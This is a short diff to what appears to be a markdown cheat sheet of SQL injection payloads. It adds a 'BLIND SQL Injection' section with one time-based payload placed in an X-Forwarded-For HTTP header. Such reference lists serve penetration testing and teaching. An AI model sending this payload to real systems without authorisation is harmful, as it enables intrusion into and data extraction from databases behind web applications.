@@ -258,6 +258,13 @@ Consists of an insertion or "injection" of a SQL query via the input data from t
   ```
 </details>
 
+### BLIND SQL Injection <br>
+- BLIND SQL Injection in the X-Fowarded-For HTTP Header:
+
+```http
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+```
+
 <br>
 
 <hr>
